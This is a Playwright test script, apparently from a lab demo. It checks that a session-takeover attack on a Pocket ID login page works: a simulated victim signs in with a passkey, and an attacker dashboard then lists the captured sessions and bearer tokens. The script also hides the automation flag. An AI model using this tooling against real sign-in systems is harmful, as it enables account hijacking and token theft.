// End-to-end check of the multi-victim login takeover against Pocket ID.
//   victim: enrolls a passkey on /login, then signs in twice (two sign-ins).
//   attacker: /attacker dashboard should list both captured sessions with names,
//             expiry countdowns, and an "Open" that shows Welcome + the bearer token.
import { chromium } from 'playwright';

const APP = process.env.APP || 'http://localhost:1411';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const V = { username: 'taylor', email: 'taylor@demo.local', first: 'Taylor', last: 'Reed' };
const log = (...a) => console.log('·', ...a);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function newCtx(browser, withAuth) {
  const ctx = await browser.newContext({ userAgent: UA, viewport: { width: 1100, height: 860 } });
  await ctx.addInitScript(() => { Object.defineProperty(navigator, 'webdriver', { get: () => false }); });
  const page = await ctx.newPage();
  page.on('console', (m) => { if (/error|fail/i.test(m.text())) log(`[${withAuth ? 'victim' : 'attacker'} console] ${m.text()}`); });
  if (withAuth) {
    const client = await ctx.newCDPSession(page);
    await client.send('WebAuthn.enable');
    await client.send('WebAuthn.addVirtualAuthenticator', { options: {
      protocol: 'ctap2', transport: 'internal', hasResidentKey: true,
      hasUserVerification: true, isUserVerified: true, automaticPresenceSimulation: true } });
  }
  return { ctx, page };
}
async function signInOnce(page) {
  await page.goto(`${APP}/login`, { waitUntil: 'domcontentloaded' });
  await page.click('#go');
  await page.waitForFunction(() => document.getElementById('home')?.style.display === 'block', null, { timeout: 20000 });
}

const browser = await chromium.launch({ headless: true });
const vic = await newCtx(browser, true);
const att = await newCtx(browser, false);
let pass = false;
try {
  // 1) Victim enrolls a passkey on the app's /login page.
  await vic.page.goto(`${APP}/login`, { waitUntil: 'domcontentloaded' });
  await vic.page.click('#setup summary');
  await vic.page.fill('#first', V.first); await vic.page.fill('#last', V.last);
  await vic.page.fill('#username', V.username); await vic.page.fill('#email', V.email);
  await vic.page.click('#enroll');
  await vic.page.waitForFunction(() => /passkey added/i.test(document.getElementById('setupStatus')?.textContent || ''), null, { timeout: 30000 });
  log('victim enrolled');

  // 2) Attacker dashboard open and waiting.
  await att.page.goto(`${APP}/attacker`, { waitUntil: 'domcontentloaded' });
  await att.page.waitForFunction(() => /waiting for a sign-in/i.test(document.body.textContent || ''), null, { timeout: 10000 });
  log('attacker waiting');

  // 3) Victim signs in twice -> two banked sessions.
  await signInOnce(vic.page); log('victim sign-in #1');
  await signInOnce(vic.page); log('victim sign-in #2');

  // 4) Dashboard should list 2 sessions with the victim's name + future expiry.
  await att.page.waitForFunction(() => document.querySelectorAll('[data-open]').length >= 2, null, { timeout: 15000 });
  const api = await (await att.page.request.get(`${APP}/x/sessions`)).json();
  const names = api.sessions.map((s) => s.name);
  const allFuture = api.sessions.every((s) => s.exp > api.now);
  log('dashboard sessions:', JSON.stringify({ count: api.sessions.length, names, allFuture }));

  // 5) Open one -> Welcome panel shows the name and a bearer token.
  await att.page.click('[data-open]');
  await att.page.waitForSelector('.bigname', { timeout: 5000 });
  const openName = (await att.page.textContent('.bigname'))?.trim();
  const tokenShown = (await att.page.textContent('.tok code'))?.trim() || '';
  log('opened session:', JSON.stringify({ openName, tokenLen: tokenShown.length }));

  pass = api.sessions.length >= 2 && names.every((n) => n === `${V.first} ${V.last}`) && allFuture
    && openName === `${V.first} ${V.last}` && tokenShown.split('.').length === 3;
} catch (e) {
  console.error('FAILED:', e.message);
  try { console.error('attacker view:', (await att.page.textContent('#view'))?.slice(0, 300)); } catch {}
} finally {
  console.log(pass ? '\nPASS: multiple sign-ins banked as sessions; dashboard lists them with expiry and token.' : '\nFAIL (see above).');
  await browser.close();
}
